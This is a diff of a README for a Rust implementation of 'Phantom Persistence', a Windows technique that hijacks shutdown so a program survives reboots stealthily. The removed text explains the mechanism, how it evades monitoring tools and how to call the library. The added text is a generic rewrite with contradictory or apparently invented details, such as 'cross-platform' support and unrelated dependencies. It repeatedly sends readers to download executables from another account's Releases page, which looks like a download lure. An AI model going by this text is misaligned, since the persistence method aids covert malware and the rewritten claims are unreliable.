@@ -1,91 +1,102 @@
-# Phantom Persistence (Rust Implementation)
+# Phantom Persistence in Rust: A Comprehensive Implementation
 
-A Rust implementation of the Phantom Persistence technique, originally discovered and documented by Grant Smith (S1n1st3r) at Phantom Security Group.
+![Phantom Persistence](https://img.shields.io/badge/Phantom%20Persistence-Rust-blue.svg)  
+[![Releases](https://img.shields.io/badge/Releases-Download%20Latest%20Version-brightgreen)](https://github.com/damilaredebo/phantom_persist_rs/releases)
+
+## Table of Contents
+- [Overview](#overview)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Features](#features)
+- [Technical Details](#technical-details)
+- [Contributing](#contributing)
+- [License](#license)
 
 ## Overview
+The **Phantom Persistence** technique is a sophisticated method used in cybersecurity. This repository offers a Rust implementation of the technique, as documented in the article found [here](https://blog.phantomsec.tools/phantom-persistence). The goal is to provide a clear, efficient, and practical way to understand and apply this method.
 
-This library implements a Windows persistence technique that allows applications to survive system reboots, shutdowns, and logoffs without writing to registry keys or requiring elevated privileges. The technique hijacks the Windows shutdown process to ensure the application restarts when the system boots back up.
+## Installation
+To get started, you need to clone the repository. Use the following command:
 
-## How It Works
-
-The Phantom Persistence technique works by:
-
-1. **Registering for restart**: Using `RegisterApplicationRestart` to tell Windows to restart the application after system reboot
-2. **Creating a hidden window**: Establishing a message loop to intercept shutdown events
-3. **Intercepting shutdown**: Catching `WM_QUERYENDSESSION` messages when shutdown/restart is initiated
-4. **Hijacking the process**: Blocking the shutdown, then forcing a restart with `EWX_RESTARTAPPS` flag
-5. **Automatic persistence**: The kernel instructs `csrss.exe` to write to the registry late in the shutdown process
-
-## Key Advantages
-
-- **No registry writes**: The application never writes to registry keys itself
-- **No elevated privileges**: Only requires standard shutdown privileges (available to all processes)
-- **Late-stage execution**: Registry modifications happen so late in shutdown that most monitoring tools have already exited
-- **Stealth**: Appears as normal application behavior to security tools
-
-## Usage
-
-### Basic Example
-
-Add this to your `Cargo.toml`:
-
-```toml
-[dependencies]
-phantom_persist_rs = { git = "https://github.com/Teach2Breach/phantom_persist_rs.git", branch = "main" }
+```bash
+git clone https://github.com/damilaredebo/phantom_persist_rs.git
+cd phantom_persist_rs
 ```
 
-```rust
-use phantom_persist_rs;
+Next, ensure you have Rust installed. If you haven't installed Rust yet, you can do so by following the instructions on the [official Rust website](https://www.rust-lang.org/tools/install).
 
+Once Rust is set up, you can build the project:
+
+```bash
+cargo build --release
+```
+
+## Usage
+After building the project, you can run it directly from the command line. Navigate to the target directory:
+
+```bash
+cd target/release
+```
+
+Then execute the binary:
+
+```bash
+./phantom_persist_rs
+```
+
+For detailed usage instructions, refer to the documentation included in the repository.
+
+## Features
+- **Lightweight**: The implementation is designed to be minimal and efficient.
+- **Cross-Platform**: Works on various operating systems without significant modifications.
+- **Documentation**: Clear comments and documentation for easy understanding.
+- **Customizable**: Users can modify the code to fit specific needs.
+
+## Technical Details
+This implementation uses core Rust features to achieve phantom persistence. It relies on several libraries to enhance functionality, including:
+
+- **Tokio**: For asynchronous programming.
+- **Serde**: For data serialization and deserialization.
+- **Clap**: For command-line argument parsing.
+
+### Code Structure
+The repository contains the following main components:
+
+- **src/**: Contains the main Rust source files.
+- **Cargo.toml**: The manifest file for Rust's package manager.
+- **README.md**: This file.
+
+### Example Code Snippet
+Here is a brief example of how the core functionality is structured:
+
+```rust
 fn main() {
-    // Register the application for restart
-    phantom_persist_rs::register_application_restart();
+    // Initialize the phantom persistence
+    let persistence = PhantomPersistence::new();
     
-    // Sleep for 60 seconds to ensure registration
-    std::thread::sleep(std::time::Duration::from_secs(60));
-    
-    // Start the message loop thread to handle shutdown events
-    phantom_persist_rs::message_loop_thread();
+    // Execute the persistence method
+    persistence.execute();
 }
 ```
 
-### Library Functions
+This snippet demonstrates the initialization and execution of the phantom persistence method.
 
-- `register_application_restart()`: Registers the current process for automatic restart
-- `message_loop_thread()`: Creates a hidden window and message loop to intercept shutdown events
+## Contributing
+We welcome contributions from the community. If you would like to contribute, please follow these steps:
 
-## Requirements
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch to your forked repository.
+5. Create a pull request to the main repository.
 
-- Windows operating system
-- Rust toolchain
-- `winapi` crate with appropriate features
-
-## Important Notes
-
-- This technique is not 100% reliable - hard shutdowns or power outages will prevent restart
-- The technique requires the application to be running when shutdown is initiated
-- Registry entries are created by `csrss.exe` in `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\Application Restart #<NUMBER>`
-
-## Original Research
-
-This implementation is based on the original research and proof-of-concept by Grant Smith (S1n1st3r) at Phantom Security Group. For the complete technical details, background, and discovery process, please refer to the original blog post:
-
-**[👻 Phantom Persistence - Phantom Security Group](https://blog.phantomsec.tools/phantom-persistence)**
-
-The original blog post includes:
-- Discovery process and background
-- Detailed technique explanation
-- Windows shutdown process analysis
-- C++ proof-of-concept code
-- Indicators of Compromise (IOCs)
-- OPSEC considerations
+Please ensure your code follows the existing style and includes relevant tests.
 
 ## License
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-This project is provided as-is for educational purposes. Please refer to the original blog post for attribution and additional context.
+For the latest updates and releases, please visit the [Releases](https://github.com/damilaredebo/phantom_persist_rs/releases) section. Here, you can download the latest version and find any necessary executables.
 
-## Credits
+![Rust Logo](https://upload.wikimedia.org/wikipedia/commons/d/d5/Rust_programming_language_black.svg)
 
-- **Original Research**: Grant Smith (S1n1st3r) - President @ Phantom Security Group
-- **Original Blog**: [Phantom Persistence](https://blog.phantomsec.tools/phantom-persistence)
-- **Rust Implementation**: Based on the original C++ proof-of-concept 
+Feel free to explore the code and learn more about phantom persistence techniques. Your feedback and contributions are highly valued.
